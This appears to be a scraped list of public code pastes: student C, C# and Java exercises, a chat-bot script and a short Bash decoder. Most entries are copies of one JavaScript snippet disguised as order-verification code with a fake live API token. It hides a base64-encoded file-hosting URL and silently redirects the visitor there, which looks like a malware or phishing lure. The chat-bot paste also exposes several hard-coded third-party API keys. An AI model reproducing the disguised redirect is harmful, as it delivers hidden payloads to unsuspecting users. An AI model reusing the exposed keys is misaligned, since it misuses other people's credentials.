  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bVqaK7Au,Market.js,hubertzoo90,JavaScript,Monday 14th of April 2025 09:26:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/51801/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qJJxCgYm,Untitled,hubertzoo90,JavaScript,Monday 14th of April 2025 09:11:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65211/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
veExE6KK,14-4-25 dibujos ASCII,Aluneth,C,Monday 14th of April 2025 09:00:52 AM CDT,"#include <stdio.h>
#include <stdlib.h>

/* char simbolo()
{
    char caracter;
    printf(""Ingrese con que simbolo desea hacer el dibujo: "");
    scanf(""%c"", &caracter);

    return caracter;
} */


int main()
{
    char caracter;
    int cantidad;
    printf(""Ingrese con que simbolo desea hacer el dibujo: "");
    scanf(""%c"",&caracter);
    printf(""Ingrese la cantidad de caracteres: "");
    scanf(""%d"",&cantidad);


    printf(""1).\n"");
    for (int j = 0; j<cantidad; j++) // Un solo for
    {
        printf(""%c"", caracter);
    }
    printf(""\n"");



    printf(""\n2).\n"");
    for (int i = 0; i<cantidad; i++) // Ambos dependen del mismo indice, ingresado por el usuario
    {
        for (int j = 0; j<cantidad; j++)
        {
            printf(""%c"", caracter);
        }
        printf(""\n"");
    }


    printf(""\n3).\n"");
    for (int i = 0; i<cantidad; i++)
    {
        for (int j = 0; j<=i; j++) // se usa <= para que se haga el recorrido completo sin \n
        {
            printf(""%c"", caracter);
        }
        printf(""\n"");
    }


    printf(""4).\n"");
    for (int i = 0; i<cantidad; i++) // Se invierte el simbolo, se inicia en cantidad y se resta el indice j
    {
        for (int j = cantidad; j>i; j--)
        {
            printf(""%c"", caracter);
        }
        printf(""\n"");
    }

    printf(""\n5).\n"");
    for (int i = 0; i<cantidad; i++)
    {
        for (int j = 0; j<=i; j++)
        {
            printf("" "");
        }
        printf(""%c"", caracter);
        printf(""\n"");
    }

    printf(""6).\n"");
    for (int i = 0; i<cantidad; i++)
    {
        for (int j = cantidad; j>=i; j--)
        {
            printf("" "");
        }
        printf(""%c"", caracter);
        printf(""\n"");
    }

    printf(""\n7).\n"");
    for (int i = 0; i<4; i++)
    {

        for (int j = 3; j>i; j--)
        {
            printf("" "");
        } // Fin del for que solo imprime espacios

        for (int k = 0; k<=i*2; k++)
        {
            printf(""%c"", caracter);
        }
        printf(""\n"");
    }


    printf(""8).\n"");
    for (int i = 0; i<4; i++)
    {

        for (int j = 0; j<i; j++)
        {
            printf("" "");
        } // Fin del for que solo imprime espacios

        for (int k = 7; k>=i*2; k--)
        {
            printf(""%c"", caracter);
        }
        printf(""\n h""); // Averiguar como eliminar el ulimo espacio
    }

    return 0;
}
"
bpJvitHy,Products.js,hubertzoo90,JavaScript,Monday 14th of April 2025 08:55:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68308/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
k6GcENyF,Project Memphis 2 Source Code,nonogamer9,JavaScript,Monday 14th of April 2025 08:53:07 AM CDT,"const prefix = ""mem!"";
const botname = ""Memphis ("" + prefix + ""start)"";
const version = ""2.0.0"";
const update = ""April 14th, 2025"";
var uses = 0;

// External API URLs
const PUTER_JS_URL = ""https://js.puter.com/v2/"";
const WEATHER_API_KEY = ""dcc6b2a3fa3d4fe58d9193316232905"";
const GOOGLE_API_KEY = ""AIzaSyDQJ7SjasKcPq_bJhCyxuaoWiVydYTGDK0"";
const GOOGLE_CX = ""c3619c6476b78442f""; // Custom Search Engine ID
const TRANSLATE_API_KEY = ""4a4725a769msh10c74bc91185a85p182f25jsn9a1a93fbbb77"";

// Load external script for AI
const script = document.createElement(""script"");
script.src = PUTER_JS_URL;
document.head.appendChild(script);

// Helper function to send messages
function sendMsg(msg) {
    setTimeout(() => {
        socket.emit(""talk"", { text: msg });
    }, 1100);
}

// AI Query Function
async function queryPuterAPI(inputText) {
    try {
        const response = await puter.ai.chat(inputText);
        return response || ""The AI couldn't generate a proper response."";
    } catch (error) {
        console.error(""Error querying Puter.js API:"", error);
        return ""Sorry, I couldn't process your request."";
    }
}

// Initialize bot
setTimeout(() => {
    socket.emit(""command"", { list: [""name"", botname] });
}, 1000);

setTimeout(() => {
    sendMsg(`${botname} is online. Type ${prefix}start for available commands.`);
}, 2000);

// Command handler
socket.on(""talk"", async (message) => {
    const text = message.text.trim(); // Trim whitespace for cleaner parsing

    // Check if the message starts with the prefix
    if (!text.startsWith(prefix)) {
        return; // Ignore messages that don't start with the bot prefix
    }

    // Extract command and arguments
    const [command, ...args] = text.slice(prefix.length).split("" "");
    const argString = args.join("" "").trim();

    // Command Handling
    switch (command.toLowerCase()) {
        case ""ask"":
            if (!argString) {
                sendMsg(`Please provide a question or prompt after '${prefix}ask'.`);
                return;
            }
            sendMsg(""- Processing your query..."");
            const aiResponse = await queryPuterAPI(argString);
            sendMsg(`**AI Response:** ${aiResponse}`);
            uses++;
            break;

        case ""start"":
            sendMsg(""__Project Memphis Start Menu__\n""
                + ""- AI: `"" + prefix + ""ask {question}`\n""
                + ""- Weather: `"" + prefix + ""weather {location}`\n""
                + ""- Games: `"" + prefix + ""snake` or `"" + prefix + ""maze`\n""
                + ""- Utilities: `"" + prefix + ""notepad`, `"" + prefix + ""calculator`, `"" + prefix + ""clock`\n""
                + ""- Search: `"" + prefix + ""google {query}`, `"" + prefix + ""translate {text} to {language}`"");
            break;

        case ""weather"":
            if (!argString) {
                sendMsg(`Please provide a location after '${prefix}weather'.`);
                return;
            }
            getWeather(argString);
            break;

        case ""snake"":
            handleSnakeCommand(argString);
            break;

        case ""maze"":
            handleMazeCommand(argString);
            break;

        case ""clock"":
            sendMsg(getCurrentTime());
            break;

        case ""calculator"":
            if (!argString) {
                sendMsg(`Please provide an operation after '${prefix}calculator'.`);
                return;
            }
            calculator(argString);
            break;

        case ""notepad"":
            handleNotepadCommand(argString);
            break;

        case ""google"":
            if (!argString) {
                sendMsg(`Please provide a search query after '${prefix}google'.`);
                return;
            }
            googleSearch(argString);
            break;

        case ""translate"":
            if (!argString) {
                sendMsg(`Please provide text and target language in the format '${prefix}translate <text> to <language>'.`);
                return;
            }
            translateText(argString);
            break;

        default:
            // Handle unrecognized commands gracefully
            sendMsg(`Invalid command. Type '${prefix}start' for a list of commands.`);
    }
});

// Utility Functions

function getCurrentTime() {
    const now = new Date();
    return `Current time is: ${now.toLocaleTimeString(""en-US"", { hour12: true })}`;
}

function getWeather(location) {
    const apiUrl = `https://api.weatherapi.com/v1/current.json?key=${WEATHER_API_KEY}&q=${encodeURIComponent(location)}`;
    
    fetch(apiUrl)
        .then((response) => response.json())
        .then((data) => {
            if (data.error) {
                sendMsg(""Unable to retrieve weather information. Please check the location."");
            } else {
                const weatherInfo = `Weather in ${data.location.name}, ${data.location.country}:\nCondition: ${data.current.condition.text}\nTemperature: ${data.current.temp_c}°C\nHumidity: ${data.current.humidity}%\nWind Speed: ${data.current.wind_kph} km/h`;
                sendMsg(weatherInfo);
            }
        })
        .catch((error) => {
            console.error(""Error:"", error);
            sendMsg(""An error occurred while retrieving weather information."");
        });
}

// Snake Game Variables
let snake = [{ x: 0, y: 0 }]; // Snake's initial position
let food = { x: 5, y: 5 }; // Food's initial position
let direction = ""right""; // Initial direction of the snake

function handleSnakeCommand(command) {
    if (command === ""play"") {
        startSnakeGame();
    } else if ([""up"", ""down"", ""left"", ""right""].includes(command)) {
        updateSnakeDirection(command);
        moveSnake();
        if (checkCollision()) {
            sendMsg(""Game Over! You collided with the wall or yourself."");
            return;
        }
        checkFoodEaten();
        sendMsg(renderSnakeGame());
    } else {
        sendMsg(`Invalid command. Use \`${prefix}snake play\` to start the game and \`${prefix}snake up/down/left/right\` to control.`);
    }
}

function startSnakeGame() {
    snake = [{ x: 0, y: 0 }];
    food = { x: Math.floor(Math.random() * 14), y: Math.floor(Math.random() * 6) };
    direction = ""right"";
    sendMsg(renderSnakeGame());
}

function updateSnakeDirection(command) {
    if (command === ""up"" && direction !== ""down"") direction = ""up"";
    else if (command === ""down"" && direction !== ""up"") direction = ""down"";
    else if (command === ""left"" && direction !== ""right"") direction = ""left"";
    else if (command === ""right"" && direction !== ""left"") direction = ""right"";
}

function moveSnake() {
    const head = { ...snake[0] };
    if (direction === ""up"") head.y--;
    else if (direction === ""down"") head.y++;
    else if (direction === ""left"") head.x--;
    else if (direction === ""right"") head.x++;
    snake.unshift(head);
}

function checkCollision() {
    const head = snake[0];
    if (head.x < 0 || head.x >= 14 || head.y < 0 || head.y >= 6) return true; // Wall collision
    for (let i = 1; i < snake.length; i++) {
        if (snake[i].x === head.x && snake[i].y === head.y) return true; // Self-collision
    }
    return false;
}

function checkFoodEaten() {
    const head = snake[0];
    if (head.x === food.x && head.y === food.y) {
        food = { x: Math.floor(Math.random() * 14), y: Math.floor(Math.random() * 6) };
    } else {
        snake.pop(); // Remove tail to maintain length
    }
}

function renderSnakeGame() {
    let board = Array.from({ length: 6 }, () => Array(14).fill(0));
    for (const segment of snake) board[segment.y][segment.x] = 1;
    board[food.y][food.x] = 2;
    return board.map(row => row.join("" "")).join(""\n"");
}

 
 
function handleMazeCommand(command) {
    if (command === ""play"") {
        startMazeGame();
    } else if (command === ""up"" || command === ""down"" || command === ""left"" || command === ""right"") {
        movePlayer(command);
    } else if (command === ""guide"") {
        sendMsg(""Welcome to mem!maze!\n\n""
          + ""You are represented by the number 9, and your goal is to reach the number 3.\n""
          + ""Use `"" + prefix + ""maze up/down/left/right` to move in the maze.\n""
          + ""Good luck!"");
    } else {
        sendMsg(""Invalid command. Use `"" + prefix + ""maze play` to start the game, `"" + prefix + ""maze up/down/left/right` to control, or `"" + prefix + ""maze guide` for instructions."");
    }
}
 
// Maze Game Variables
const mazeRows = 6;
const mazeColumns = 14;
const wallChance = 0.3;
let maze;
let playerPosition;
let goalPosition;

function handleMazeCommand(command) {
    if (command === ""play"") {
        startMazeGame();
    } else if ([""up"", ""down"", ""left"", ""right""].includes(command)) {
        movePlayer(command);
    } else if (command === ""guide"") {
        sendMsg(`Welcome to mem!maze!\n\nYou are represented by the number 9, and your goal is to reach the number 3.\nUse \`${prefix}maze up/down/left/right\` to move in the maze.\nGood luck!`);
    } else {
        sendMsg(`Invalid command. Use \`${prefix}maze play\` to start the game, \`${prefix}maze up/down/left/right\` to control, or \`${prefix}maze guide\` for instructions.`);
    }
}

function startMazeGame() {
    maze = generateRandomMaze();
    playerPosition = { x: Math.floor(mazeColumns / 2), y: mazeRows - 1 };
    maze[playerPosition.y][playerPosition.x] = 9;
    goalPosition = generateRandomGoalPosition();
    maze[goalPosition.y][goalPosition.x] = 3;
    sendMsg(renderMaze());
}

function generateRandomMaze() {
    return Array.from({ length: mazeRows }, () =>
        Array.from({ length: mazeColumns }, () => Math.random() < wallChance ? 1 : 0)
    );
}

function generateRandomGoalPosition() {
    let x, y;
    do {
        x = Math.floor(Math.random() * mazeColumns);
        y = Math.floor(Math.random() * mazeRows);
    } while (maze[y][x] !== 0);
    return { x, y };
}

function movePlayer(command) {
    const { x, y } = playerPosition;
    let newX = x, newY = y;

    if (command === ""up"") newY--;
    else if (command === ""down"") newY++;
    else if (command === ""left"") newX--;
    else if (command === ""right"") newX++;

    if (newX >= 0 && newX < mazeColumns && newY >= 0 && newY < mazeRows && maze[newY][newX] !== 1) {
        maze[y][x] = 0; // Clear previous position
        playerPosition = { x: newX, y: newY };
        maze[newY][newX] = 9; // Update player position

        if (newX === goalPosition.x && newY === goalPosition.y) {
            sendMsg(""Congratulations! You reached the goal!"");
            startMazeGame(); // Restart game
            return;
        }
        sendMsg(renderMaze());
    } else {
        sendMsg(""You cannot move in that direction."");
        sendMsg(renderMaze());
    }
}

function renderMaze() {
    return maze.map(row => row.join("" "")).join(""\n"");
}

// Notepad Variables
let notepads = [];
let notepadCounter = 1;
let notepadState = 'idle'; // Tracks the state of the current notepad

function handleNotepadCommand(command) {
    const [action, ...args] = command.split("" "");
    const content = args.join("" "").trim();

    switch (action.toLowerCase()) {
        case ""create"":
            createNotepad();
            break;

        case ""write"":
            if (!content) {
                sendMsg(""Please provide content to write. Example: `mem!notepad write This is my note.`"");
            } else {
                writeOnNotepad(content);
            }
            break;

        case ""save"":
            saveNotepad();
            break;

        case ""list"":
            listNotepads();
            break;

        case ""delete"":
            if (!args[0]) {
                sendMsg(""Please provide a notepad ID to delete. Example: `mem!notepad delete 1`."");
            } else {
                deleteNotepad(args[0]);
            }
            break;

        case ""modify"":
            if (!args[0]) {
                sendMsg(""Please provide a notepad ID to modify. Example: `mem!notepad modify 1`."");
            } else {
                modifyNotepad(args[0]);
            }
            break;

        case ""read"":
            if (!args[0]) {
                sendMsg(""Please provide a notepad ID to read. Example: `mem!notepad read 1`."");
            } else {
                readNotepad(args[0]);
            }
            break;

        default:
            sendMsg(`Invalid command. Use \`${prefix}notepad create/write/save/list/delete/modify/read\`.`);
    }
}

function createNotepad() {
    if (notepadState !== 'idle') {
        sendMsg(""A notepad is already in progress. Please save or cancel it before creating a new one."");
        return;
    }

    const newNotepad = { id: notepadCounter++, content: """", created: new Date() };
    notepads.push(newNotepad);
    notepadState = 'created';
    sendMsg(`New notepad created with ID: ${newNotepad.id}`);
}

function writeOnNotepad(content) {
    const currentNotepad = getCurrentNotepad();
    if (!currentNotepad) return;

    currentNotepad.content += content + ""\n"";
    notepadState = 'modified';
    sendMsg(""Content added to the current notepad."");
}

function saveNotepad() {
    const currentNotepad = getCurrentNotepad();
    if (!currentNotepad) return;

    sendMsg(`Notepad ID ${currentNotepad.id} saved successfully.`);
    console.log(`Saved Notepad Content:\n${currentNotepad.content}`);
    notepads = notepads.map(np => (np.id === currentNotepad.id ? currentNotepad : np));
    notepadState = 'idle';
}

function listNotepads() {
    if (notepads.length === 0) {
        sendMsg(""No notepads have been created yet."");
        return;
    }

    let response = ""__List of Notepads__:\n"";
    for (const np of notepads) {
        response += `ID: ${np.id}, Created On: ${np.created.toLocaleString()}, Content Length: ${np.content.length} characters\n`;
    }
    sendMsg(response);
}

function deleteNotepad(id) {
    const index = parseInt(id, 10) - 1;
    if (index < 0 || index >= notepads.length) {
        sendMsg(""Invalid Notepad ID. Please provide a valid ID from the list."");
        return;
    }

    notepads.splice(index, 1);
    sendMsg(`Deleted Notepad with ID: ${id}`);
}

function modifyNotepad(id) {
    const index = parseInt(id, 10) - 1;
    if (index < 0 || index >= notepads.length) {
        sendMsg(""Invalid Notepad ID. Please provide a valid ID from the list."");
        return;
    }

    const selectedNotepad = notepads[index];
    selectedNotepad.content += ""\n""; // Open it for modification
    notepads[index] = selectedNotepad;
    
	sendMsg(`Modifying Notedpad`);
}

function readNotepad(id) {
    const notepadId = parseInt(id, 10);
    const selectedNotepad = notepads.find(np => np.id === notepadId);

    if (!selectedNotepad) {
        sendMsg(""Invalid Notepad ID. Please provide a valid ID from the list."");
        return;
    }

    if (selectedNotepad.content.trim() === """") {
        sendMsg(`Notepad ID ${notepadId} is empty.`);
    } else {
        sendMsg(`__Content of Notepad ID ${notepadId}__:\n${selectedNotepad.content}`);
    }
}
 
// New calculator function
function calculator(operation) {
    const parts = operation.split("" "");
    const operator = parts[1];
    const a = parseFloat(parts[0]);
    const b = parseFloat(parts[2]);
 
    let result;
    switch (operator) {
        case ""+"":
            result = a + b;
            break;
        case ""-"":
            result = a - b;
            break;
        case ""*"":
            result = a * b;
            break;
        case ""/"":
            result = a / b;
            break;
        default:
            sendMsg(""Invalid operation. Please use the format: 'num1 operator num2'. Supported operators are +, -, *, /."");
            return;
    }
 
    sendMsg(`Result: ${result}`);
}

function googleSearch(searchQuery) {
    const apiUrl = `https://www.googleapis.com/customsearch/v1?q=${encodeURIComponent(searchQuery)}&key=${GOOGLE_API_KEY}&cx=${GOOGLE_CX}`;

    fetch(apiUrl)
        .then((response) => response.json())
        .then((data) => {
            if (data.items && data.items.length > 0) {
                const resultsText = data.items.slice(0, 2).map((item, index) => `${index+1}. ${item.title}\n   ${item.link}`).join(""\n"");
                sendMsg(`Google Search Results for '${searchQuery}':\n${resultsText}`);
            } else {
                sendMsg(`No results found for '${searchQuery}'.`);
            }
        })
        .catch((error) => {
            console.error(""Error fetching Google Search API:"", error);
            sendMsg(""An error occurred while fetching Google Search results."");
        });
}

function translateText(translationQuery) {
    const languages = {
        english: 'en',
        french: 'fr',
        japanese: 'ja',
        spanish: 'es',
        german: 'de',
        chinese: 'zh',
        russian: 'ru',
        italian: 'it',
        portuguese: 'pt',
        dutch: 'nl',
        korean: 'ko',
        arabic: 'ar',
        hindi: 'hi',
        greek: 'el',
        swedish: 'sv',
        turkish: 'tr',
        vietnamese: 'vi',
        thai: 'th',
        hebrew: 'he',
        polish: 'pl',
        danish: 'da',
        finnish: 'fi',
        norwegian: 'no',
        czech: 'cs',
        hungarian: 'hu',
        indonesian: 'id',
        malay: 'ms',
        romanian: 'ro',
        bulgarian: 'bg',
        croatian: 'hr',
        slovak: 'sk',
        ukrainian: 'uk'
    };

    if (translationQuery.trim().toLowerCase() === ""list languages"") {
        sendMsg(""Supported languages are:\n"" + Object.keys(languages).join("", ""));
        return;
    }

    const [text, targetLanguage] = translationQuery.split("" to "");
    if (!text || !targetLanguage) {
        sendMsg(""Invalid format. Use `"" + prefix + ""translate <text> to <target language>`."");
        return;
    }

    const targetLangCode = languages[targetLanguage.trim().toLowerCase()];
    if (!targetLangCode) {
        sendMsg(""Invalid target language. Use `"" + prefix + ""translate list languages` to see supported languages."");
        return;
    }

    const apiUrl = ""https://deep-translate1.p.rapidapi.com/language/translate/v2"";

    const data = {
        q: text.trim(),
        target: targetLangCode
    };

    fetch(apiUrl, {
        method: ""POST"",
        headers: {
            ""Content-Type"": ""application/json"",
            ""X-RapidAPI-Host"": ""deep-translate1.p.rapidapi.com"",
            ""X-RapidAPI-Key"": TRANSLATE_API_KEY
        },
        body: JSON.stringify(data)
    })
    .then((response) => response.json())
    .then((data) => {
        if (data.data && data.data.translations) {
            sendMsg(`Translation:\n""${text.trim()}"" → ""${data.data.translations.translatedText}""`);
        } else {
            sendMsg(""Translation error. Please check the input and target language."");
            console.error(""Translation error:"", data);
        }
    })
    .catch((error) => {
        console.error(""Error:"", error);
        sendMsg(""An error occurred while translating the text."");
    });
}
"
NZ36sDyp,CalcStart,cuniszkiewicz,C#,Monday 14th of April 2025 08:41:32 AM CDT,"using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Calculator
{
    public partial class Form1 : Form
    {
        double a, b, result = 0;
        char operation;

        public Form1()
        {
            InitializeComponent();
        }

        private void btnEq_Click(object sender, EventArgs e)
        {
            b = int.Parse(lblScreen.Text);
            lblScreen.Text = """";

            switch (operation)
            {
                case '+':
                    result = a + b;
                    break;
                case '-':
                    result = a - b;
                    break;
                case '*':
                    result = a * b;
                    break;
                case '/':
                    if (b != 0)
                        result = a / b;
                    else
                        MessageBox.Show(""Don't devide by 0!"");
                    break;

            }

            //lblScreen.Text = result.ToString();
            lblScreen.Text = $""{result}""; 
        }

        private void btn1_Click(object sender, EventArgs e)
        {
            Button button = (Button)sender;
            lblScreen.Text += button.Text;
        }

        private void btnPlus_Click(object sender, EventArgs e)
        {
            Button button = (Button)sender;
            a = int.Parse(lblScreen.Text);
            lblScreen.Text = """";
            operation = char.Parse(button.Text);
        }
    }
}
"
C4JQghrG,Order.js,hubertzoo90,JavaScript,Monday 14th of April 2025 08:40:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/67962/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KzFJr2CW,Untitled,lu6id,Bash,Monday 14th of April 2025 08:36:34 AM CDT,"#!/bin/bash
hex=""1f0b170b1c430f00001c4e060a001c430a""
key=78
msg=""""
for ((i=0; i<${#hex}; i+=2)); do
  byte=$((16#${hex:$i:2}))
  dec=$((byte ^ key))
  char=$(printf '%03o' $dec)
  msg+=$(printf ""\\$char"")
done
say ""$msg""
"
pbw7FwnW,Market.js,hubertzoo90,JavaScript,Monday 14th of April 2025 08:24:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/35746/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zrQuPGwy,Untitled,hubertzoo90,JavaScript,Monday 14th of April 2025 08:09:17 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/95175/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BS2GZGiY,tic tac toe,adityasuman100,Java,Monday 14th of April 2025 08:01:57 AM CDT,"
// Missing import statements
import java.util.Scanner;
import java.util.Random;
// Main class to run the game
public class Solution {
    public static void main(String[] args) {
        GameBoard board = new GameBoard();
        Player player1 = new HumanPlayer('X');
        Player player2 = new HumanPlayer('O');
        GameController controller = new GameController(board, player1, player2);
        
        controller.startGame();
    }
}

// Interface for players (following Interface Segregation Principle)
interface Player {
    Move makeMove(GameBoard board);
    char getSymbol();
}

// Board represents the game state (Single Responsibility Principle)
class GameBoard {
    private static final int SIZE = 3;
    private char[][] board;
    
    public GameBoard() {
        board = new char[SIZE][SIZE];
        initializeBoard();
    }
    
    private void initializeBoard() {
        for (int i = 0; i < SIZE; i++) {
            for (int j = 0; j < SIZE; j++) {
                board[i][j] = ' ';
            }
        }
    }
    
    public boolean isCellEmpty(int row, int col) {
        return board[row][col] == ' ';
    }
    
    public void placeMove(Move move, char symbol) {
        if (isValidMove(move)) {
            board[move.getRow()][move.getCol()] = symbol;
        }
    }
    
    public boolean isValidMove(Move move) {
        int row = move.getRow();
        int col = move.getCol();
        
        return row >= 0 && row < SIZE && 
               col >= 0 && col < SIZE && 
               isCellEmpty(row, col);
    }
    
    public boolean isBoardFull() {
        for (int i = 0; i < SIZE; i++) {
            for (int j = 0; j < SIZE; j++) {
                if (board[i][j] == ' ') {
                    return false;
                }
            }
        }
        return true;
    }
    
    public boolean checkWin(char symbol) {
        // Check rows
        for (int i = 0; i < SIZE; i++) {
            if (board[i][0] == symbol && board[i][1] == symbol && board[i][2] == symbol) {
                return true;
            }
        }
        
        // Check columns
        for (int i = 0; i < SIZE; i++) {
            if (board[0][i] == symbol && board[1][i] == symbol && board[2][i] == symbol) {
                return true;
            }
        }
        
        // Check diagonals
        if (board[0][0] == symbol && board[1][1] == symbol && board[2][2] == symbol) {
            return true;
        }
        
        if (board[0][2] == symbol && board[1][1] == symbol && board[2][0] == symbol) {
            return true;
        }
        
        return false;
    }
    
    public void printBoard() {
        System.out.println(""-------------"");
        for (int i = 0; i < SIZE; i++) {
            System.out.print(""| "");
            for (int j = 0; j < SIZE; j++) {
                System.out.print(board[i][j] + "" | "");
            }
            System.out.println();
            System.out.println(""-------------"");
        }
    }
    
    public void reset() {
        initializeBoard();
    }
    
    public int getSize() {
        return SIZE;
    }
}

// Value Object for move coordinates (Immutability)
class Move {
    private final int row;
    private final int col;
    
    public Move(int row, int col) {
        this.row = row;
        this.col = col;
    }
    
    public int getRow() {
        return row;
    }
    
    public int getCol() {
        return col;
    }
}

// Human player implementation
class HumanPlayer implements Player {
    private final char symbol;
    private final Scanner scanner;
    
    public HumanPlayer(char symbol) {
        this.symbol = symbol;
        this.scanner = new Scanner(System.in);
    }
    
    @Override
    public Move makeMove(GameBoard board) {
        int row, col;
        Move move;
        
        do {
